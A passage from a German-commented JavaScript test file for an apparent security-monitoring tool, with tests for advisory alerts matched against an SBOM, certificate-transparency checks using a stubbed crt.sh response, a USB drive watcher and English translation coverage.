    check('hinweise: doppelte Hinweise nur einmal gespeichert', added.length === 1 && w.addAlerts(path.join(dir, 'a.json'), s2.alerts).length === 0);
    w.dismissAlert(path.join(dir, 'a.json'), s2.alerts[0].key);
    check('hinweise: ausblenden merkt sich den Hinweis', w.loadAlerts(path.join(dir, 'a.json'))[0].dismissed === true);
    const adv = w.advisoryAlerts([{ title: '[NEU] [hoch] lodash: Schwachstelle ermöglicht Codeausführung', link: 'https://wid.cert-bund.de/x' }, { title: '[NEU] Microsoft Windows: mehrere Schwachstellen', link: 'https://wid.cert-bund.de/y' }], sboms);
    keep(adv.map((a) => ({ description: a.detail }))); // Titel enthaelt den (deutschen) Originaltitel des BSI
    check('bsi: Hinweis zu einem Paket aus der SBOM gefunden, fremde ignoriert', adv.length === 1 && /lodash/.test(adv[0].title) && adv[0].severity === 'high');
    // CT-Logs
    let round = 1;
    const ctFake = async (url) => {
      const certs = [{ id: 1, issuer_name: 'C=US, O=Let\'s Encrypt, CN=R11', name_value: 'meine-firma.de\nwww.meine-firma.de', not_before: '2026-10-01T00:00:00' }];
      if (round === 2) certs.push({ id: 2, issuer_name: 'C=XX, O=Unknown CA Ltd, CN=Evil', name_value: 'login.meine-firma.de', not_before: '2026-11-04T00:00:00' });
      if (round === 2) certs.push({ id: 3, issuer_name: 'C=US, O=Let\'s Encrypt, CN=R10', name_value: 'api.meine-firma.de', not_before: '2026-11-04T00:00:00' });
      if (!url.startsWith('https://crt.sh/')) throw new Error('falscher Host');
      return { ok: true, status: 200, arrayBuffer: async () => Buffer.from(JSON.stringify(certs)) };
    };
    const c1 = await w.checkCt(['www.meine-firma.de', 'kein domain!'], path.join(dir, 'ct.json'), { fetchImpl: ctFake });
    round = 2;
    const c2 = await w.checkCt(['meine-firma.de'], path.join(dir, 'ct.json'), { fetchImpl: ctFake });
    keep(c2.alerts.map((a) => ({ title: a.title, description: a.detail })));
    check('ct: erster Lauf ohne Hinweise, danach neue Zertifikate gemeldet', c1.alerts.length === 0 && c2.alerts.length === 2);
    check('ct: unbekannte Zertifizierungsstelle -> hoch, bekannte -> niedrig', c2.alerts.find((a) => a.key === 'ct:2').severity === 'high' && c2.alerts.find((a) => a.key === 'ct:3').severity === 'low');
  }

  // --- USB ---
  {
    const { createUsbWatcher, diffDrives } = require('../src/core/usbwatch');
    check('usb: neue Laufwerksbuchstaben erkannt', diffDrives(['C', 'D'], ['C', 'D', 'E', 'F']).join() === 'E,F');
    let cur = ['C'];
    const seen = [];
    const wt = createUsbWatcher({ list: async () => cur, type: async (l) => (l === 'E' ? 2 : 3), onNew: (d) => seen.push(d) });
    await wt.tick(); cur = ['C', 'E', 'F']; await wt.tick();
    const off = createUsbWatcher({ list: async () => cur, type: async () => 2, onNew: (d) => seen.push('x' + d), isEnabled: () => false });
    await off.tick(); cur = ['C', 'E', 'F', 'G']; await off.tick();
    check('usb: nur Wechseldatenträger, nur wenn eingeschaltet, erst nach Start-Stand', seen.length === 1 && seen[0] === 'E:\\');
  }

  // --- Englische Texte ---
  {
    const i18n = require('../src/core/findings-i18n');
    const GER = /[äöüß]|\b(der|die|das|und|nicht|ist|mit|für|oder|wird|werden|auf|eine?|zu|von|bei|nach|aus|sich)\b/;
    const en = all.map(i18n.localizeFinding);
    const left = en.flatMap((f) => [f.title, f.description, f.impact, f.remediation]).filter((t) => t && GER.test(t.replace(/„[^“]*“|“[^”]*”/g, '')));
    check('englisch: neue Befund- und Hinweistexte übersetzt', left.length === 0);
    if (left.length) console.log('    noch deutsch:', left.slice(0, 3).join(' | '));
  }

  try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* egal */ }
};
